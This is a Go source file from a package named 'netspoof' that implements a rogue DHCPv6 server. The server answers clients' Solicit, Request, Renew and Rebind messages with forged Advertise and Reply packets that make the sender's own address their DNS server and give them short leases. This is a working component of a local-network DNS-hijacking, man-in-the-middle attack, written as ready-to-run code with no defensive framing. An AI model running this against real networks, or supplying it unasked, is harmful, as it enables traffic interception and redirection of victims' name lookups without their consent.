package netspoof

import (
	"context"
	"fmt"
	"net"
	"net/netip"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/mdlayher/dhcp6"
	"github.com/mdlayher/dhcp6/dhcp6opts"
)

const (
	dhcp6T1    = 30 * time.Second
	dhcp6T2    = 48 * time.Second
	dhcp6Valid = 60 * time.Second
)

// RunDHCP6 replies to DHCPv6 Solicit/Request/Renew/Rebind with our own
// link-local address and DNS server information.
func RunDHCP6(ctx context.Context, sess *Session) error {
	defer func() { sess.DHCP6Active = false }()

	if !sess.OurIPv6.IsValid() {
		return fmt.Errorf("[dhcp6] no link-local IPv6 address on interface")
	}
	if !sess.DHCP6DNS.IsValid() {
		sess.DHCP6DNS = sess.OurIPv6
	}

	duid, err := dhcp6opts.NewDUIDLLT(1, time.Date(2000, 1, 1, 0, 0, 0, 0, time.UTC), sess.IfaceMAC)
	if err != nil {
		return fmt.Errorf("[dhcp6] duid: %w", err)
	}
	duidRaw, err := duid.MarshalBinary()
	if err != nil {
		return fmt.Errorf("[dhcp6] duid marshal: %w", err)
	}

	handle, err := OpenPacketHandle(sess.IfaceName, true)
	if err != nil {
		return fmt.Errorf("[dhcp6] packet handle open: %w", err)
	}
	defer handle.Close()
	sess.TrackHandle(handle)

	fmt.Printf("[dhcp6] started: duid=%x dns=%s\n", duidRaw, sess.DHCP6DNS)

	src := gopacket.NewPacketSource(handle, layers.LinkTypeEthernet)
	packets := src.Packets()

	for {
		select {
		case <-ctx.Done():
			fmt.Println("[dhcp6] stopping (leases expire in 60s)")
			return nil
		case pkt, ok := <-packets:
			if !ok || pkt == nil {
				continue
			}
			handleDHCP6(sess, pkt, duidRaw)
		}
	}
}

func handleDHCP6(sess *Session, pkt gopacket.Packet, duidRaw []byte) {
	ip6L := pkt.Layer(layers.LayerTypeIPv6)
	udpL := pkt.Layer(layers.LayerTypeUDP)
	if ip6L == nil || udpL == nil {
		return
	}
	ip6 := ip6L.(*layers.IPv6)
	udp := udpL.(*layers.UDP)

	if udp.DstPort != 547 {
		return
	}

	var dhcp dhcp6.Packet
	if err := dhcp.UnmarshalBinary(udp.Payload); err != nil {
		return
	}

	clientMAC := macFromIPv6(ip6.SrcIP, pkt)

	switch dhcp.MessageType {
	case dhcp6.MessageTypeSolicit:
		adv, err := buildDHCP6Reply(dhcp6.MessageTypeAdvertise, dhcp, duidRaw, sess)
		if err != nil {
			fmt.Printf("[dhcp6] advertise build: %v\n", err)
			return
		}
		sendDHCP6(sess, ip6.SrcIP, adv)
		fmt.Printf("[dhcp6] ADVERTISE -> %s (mac=%s)\n", ip6.SrcIP, clientMAC)

	case dhcp6.MessageTypeRequest, dhcp6.MessageTypeRenew, dhcp6.MessageTypeRebind:
		if !dhcp6ServerIDMatches(dhcp, duidRaw) {
			return
		}
		reply, err := buildDHCP6Reply(dhcp6.MessageTypeReply, dhcp, duidRaw, sess)
		if err != nil {
			fmt.Printf("[dhcp6] reply build: %v\n", err)
			return
		}
		sendDHCP6(sess, ip6.SrcIP, reply)
		fmt.Printf("[dhcp6] REPLY -> %s (mac=%s)\n", ip6.SrcIP, clientMAC)
	}
}

func buildDHCP6Reply(msgType dhcp6.MessageType, req dhcp6.Packet, duidRaw []byte, sess *Session) ([]byte, error) {
	opts := make(dhcp6.Options)

	if raw, ok := req.Options[dhcp6.OptionClientID]; ok && len(raw) > 0 {
		opts.AddRaw(dhcp6.OptionClientID, raw[0])
	} else {
		return nil, fmt.Errorf("no client id")
	}

	opts.AddRaw(dhcp6.OptionServerID, duidRaw)
	opts.AddRaw(dhcp6.OptionDNSServers, sess.DHCP6DNS.AsSlice())

	if raw, ok := req.Options[dhcp6.OptionIANA]; ok && len(raw) > 0 {
		var reqIANA dhcp6opts.IANA
		if err := reqIANA.UnmarshalBinary(raw[0]); err != nil {
			return nil, fmt.Errorf("bad IANA: %w", err)
		}

		var clientID []byte
		if cidRaw, ok := req.Options[dhcp6.OptionClientID]; ok && len(cidRaw) > 0 {
			clientID = cidRaw[0]
		}
		clientMAC := macFromDUID(clientID)
		addr := eui64LinkLocal(clientMAC)

		iaaddr, err := dhcp6opts.NewIAAddr(
			net.IP(addr.AsSlice()),
			dhcp6Valid,
			dhcp6Valid,
			nil,
		)
		if err != nil {
			return nil, fmt.Errorf("iaaddr: %w", err)
		}
		iaaddrRaw, err := iaaddr.MarshalBinary()
		if err != nil {
			return nil, fmt.Errorf("iaaddr marshal: %w", err)
		}

		ianaOpts := make(dhcp6.Options)
		ianaOpts.AddRaw(dhcp6.OptionIAAddr, iaaddrRaw)

		iana := dhcp6opts.NewIANA(reqIANA.IAID, dhcp6T1, dhcp6T2, ianaOpts)
		ianaRaw, err := iana.MarshalBinary()
		if err != nil {
			return nil, fmt.Errorf("iana marshal: %w", err)
		}
		opts.AddRaw(dhcp6.OptionIANA, ianaRaw)
	}

	pkt := dhcp6.Packet{
		MessageType:   msgType,
		TransactionID: req.TransactionID,
		Options:       opts,
	}
	return pkt.MarshalBinary()
}

func dhcp6ServerIDMatches(req dhcp6.Packet, duidRaw []byte) bool {
	raw, ok := req.Options[dhcp6.OptionServerID]
	if !ok || len(raw) == 0 {
		return false
	}
	return string(raw[0]) == string(duidRaw)
}

func sendDHCP6(sess *Session, dstIP net.IP, payload []byte) {
	ip6 := &layers.IPv6{
		Version:    6,
		NextHeader: layers.IPProtocolUDP,
		HopLimit:   64,
		SrcIP:      net.IP(sess.OurIPv6.AsSlice()),
		DstIP:      dstIP,
	}
	udp := &layers.UDP{SrcPort: 547, DstPort: 546}
	udp.SetNetworkLayerForChecksum(ip6)

	dstMAC := net.HardwareAddr{0x33, 0x33, 0x00, 0x01, 0x00, 0x02}
	eth := &layers.Ethernet{
		SrcMAC:       sess.IfaceMAC,
		DstMAC:       dstMAC,
		EthernetType: layers.EthernetTypeIPv6,
	}

	buf := gopacket.NewSerializeBuffer()
	serOpts := gopacket.SerializeOptions{FixLengths: true, ComputeChecksums: true}
	if err := gopacket.SerializeLayers(buf, serOpts, eth, ip6, udp, gopacket.Payload(payload)); err != nil {
		fmt.Printf("[dhcp6] serialize error: %v\n", err)
		return
	}
	_ = sess.Tx.Send(buf.Bytes())
}

func eui64LinkLocal(mac net.HardwareAddr) netip.Addr {
	if len(mac) < 6 {
		mac = []byte{0, 0, 0, 0, 0, 0}
	}
	var a [16]byte
	a[0] = 0xfe
	a[1] = 0x80
	a[8] = mac[0] ^ 0x02
	a[9] = mac[1]
	a[10] = mac[2]
	a[11] = 0xff
	a[12] = 0xfe
	a[13] = mac[3]
	a[14] = mac[4]
	a[15] = mac[5]
	return netip.AddrFrom16(a)
}

func macFromDUID(duid []byte) net.HardwareAddr {
	if len(duid) < 6 {
		return nil
	}
	return net.HardwareAddr(duid[len(duid)-6:])
}

func macFromIPv6(ip net.IP, pkt gopacket.Packet) string {
	if ethL := pkt.Layer(layers.LayerTypeEthernet); ethL != nil {
		if eth, ok := ethL.(*layers.Ethernet); ok {
			return eth.SrcMAC.String()
		}
	}
	return ip.String()
}
